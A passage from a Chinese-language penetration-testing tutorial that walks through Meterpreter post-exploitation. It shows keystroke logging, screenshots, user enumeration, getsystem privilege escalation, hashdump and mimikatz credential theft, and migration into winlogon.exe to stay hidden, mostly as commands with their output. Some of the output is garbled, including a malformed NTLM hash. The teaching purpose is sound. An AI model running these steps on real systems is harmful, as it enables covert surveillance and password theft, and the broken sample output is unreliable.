    ## 键盘捕获


    测试渗透人员可以通过启动键盘捕获功能，获取目标用户输入的信息，例如用户名和密码。


    其中，启动键盘捕获的命令如下：


    ```

    meterpreter > keyscan_start

    ```


    正在启动键盘监听器...


    从输出信息可以看出，键盘捕获已成功启动。为了模拟这一测试过程，用户可以在目标主机上手动输入一些信息，供测试渗透人员捕获。


    当用户在目标主机上输入某些信息时，可以在攻击主机上使用 `keyscan_dump` 命令获取输入的信息。


    ```

    meterpreter > keyscan_dump

    ```


    正在转储捕获的按键... < Return > < Return > < Return > < N1 > < Return > 2 < Return > 34


    从输出信息可以看出，目标用户输入的信息已成功捕获。如果用户不想继续捕获目标主机的数据，可以停止键盘捕获。


    执行以下命令：


    ```

    meterpreter > keyscan_stop

    ```


    正在停止键盘监听器...


    看到上述输出信息表明键盘捕获已成功停止。


    ## 截图


    用户可以通过实现截图功能查看目标用户正在执行的操作，例如打开文件和网页。以下命令将对目标屏幕进行截图。


    执行以下命令：


    ```

    meterpreter > screenshot

    ```

    截图已保存至:/root/example.jpeg


    从输出信息可以看出，目标主机的屏幕已成功拦截并保存到 `/root/example.jpeg` 文件中。此时，用户可以查看截图以确认目标用户执行的操作。


    如截图中所示，目标用户正在浏览 CSDN 博客网页。


    ## 列举用户


    渗透测试员还可以使用 `run post/windows/gather/enum_logged_on_user` 命令枚举目标主机上的用户。


    执行命令如下：￼


    ```

    meterpreter> run post/windows/gather/enum_logged_on_users

    ```


    从输出信息中，你可以看到目标主机上只有一个用户，其用户为 `Administrator`。


    ## 权限提升


    在某些情况下，用户获取的 Meterpreter 会话会受到用户权限的限制，这将影响渗透测试员在目标系统中的操作，例如修改注册表、安装后门或导出密码。此时，用户可以使用
    `getsystem` 命令提升当前用户的权限。接下来将介绍如何提升用户权限。


    ### 提升普通用户的权限


    首先检查当前用户的权限信息。


    执行命令如下：￼


    ```

    meterpreter> getuid

    ```

    服务器用户名: exampleserver-PC\bob


    ```


    从输出信息中，我们可以看到当前用户是一个普通用户，其用户名为 `bob`。接下来，用户将提升权限。


    执行命令如下：￼


    ```

    meterpreter> getsystem

    ```


    看到上述输出信息，意味着当前用户已成功提升。此时，再次检查用户权限。


    结果如下：￼


    ```

    meterpreter> getuid

    ```

    服务器用户名: NT AUTHORITY\SYSTEM


    ```


    从输出信息中，你可以看到当前用户的权限为 `NT AUTHORITY\SYSTEM`。这表明用户的权限已成功提升。


    ## 获取用户密码


    当用户获取的 Meterpreter 会话具有某些权限时，就可以获取用户密码。接下来将使用 `hashdump` 命令获取用户密码。


    执行命令如下：


    ```

    meterpreter> hashdump Administrator: 500:

    ```


    从输出信息中，我们可以看到目标主机上有 3 个用户，即 `Administrator`、`bob` 和 `Guest`。


    上述输出信息的格式为 `username: SID: LM hash: NTLM hash`。其中，LM 哈希 `ccd3b653b51404 eead3b653b51404ee`
    和 NTLM 哈希 `31d6ccy0d16ae981b23c89d7e0c045c0` 空密码。


    使用 `hashdump` 命令获得的哈希密码需要进一步破解才能获得真实密码。此时，用户也可以通过加载 `mimikatz` 模块获取用户密码。然而，该模块的命令适用于
    32 位系统。接下来将介绍如何使用 `mimikatz` 模块获取用户密码。


    具体步骤如下：


    1) 加载 `mimikatz` 模块。


    执行命令如下：￼


    ```

    meterpreter> load mimikatz

    ```


    看到上述输出信息，意味着 `mimikatz` 模块已成功加载。此时，你可以使用 `help mimikatz` 命令查看 `mimikatz` 模块支持的所有命令。详情如下：


    ```

    meterpreter> help mimikatz

    ```


    从上述输出中，你可以看到 `mimikatz` 模块支持的所有命令。接下来，我们将介绍如何使用这些命令获取用户密码。


    2) 使用 `mimikatz` 命令获取用户密码。


    执行命令如下：￼


    ```

    meterpreter> mimikatz -f

    ```


    从输出信息中，我们可以看到目标主机上有 3 个用户，即 `Administrator`、`bob` 和 `Guest`。用户的密码已成功捕获。


    3) 使用 `msv` 命令获取用户哈希。


    执行命令如下：￼


    ```

    meterpreter> msv

    ```


    从输出信息可以看出，用户哈希已成功捕获。


    4) 使用 `wdigest` 命令获取内存中的明文密码。


    执行命令如下：￼


    ```

    meterpreter> wdigest

    ```


    从输出信息中，我们可以看到登录用户的明文密码。


    ## 第 33 章


    ## 使用 Metploit 绑定


    ![](img/image_rsrc49Z.jpg)


    ### 绑定进程


    Meterpreter 可以独立运行，也可以绑定其他进程。当 Meterpreter 独立运行时，很容易被发现。如果你将其绑定到系统中运行的进程，就可以实现持久化。绑定方法的介绍如下：


    1) 查看系统中运行的进程。


    执行命令如下：￼


    ```

    meterpreter> ps

    ```


    从输出信息中可以看到系统中运行的所有进程。输出包含 7 列，分别代表 `PID`（进程 ID）、`PPID`（父进程 ID）、`Name`（进程名）、`Arch`（架构）、`Session`（会话）、`User`（用户名）和
    `Path`（路径）。例如，这里将选择 Meterpreter 绑定到 `winlogon.exe` 进程。其中，进程 ID 为 400。


    2) 使用 `getpid` 命令查看当前进程 ID。


    执行命令如下：￼


    ```

    meterpreter> getpid

    ```

    当前 pid: 1096


    从输出信息中，可以看到当前 PID 为 1096。


    3) 使用 `migrate` 命令绑定进程。


    执行命令如下：￼


    ```

    meterpreter> migrate 400

    ```

    [＊] 正在从 1096 迁移到 400...

    [＊] 迁移成功完成。


    4) 绑定进程并捕获键盘记录。

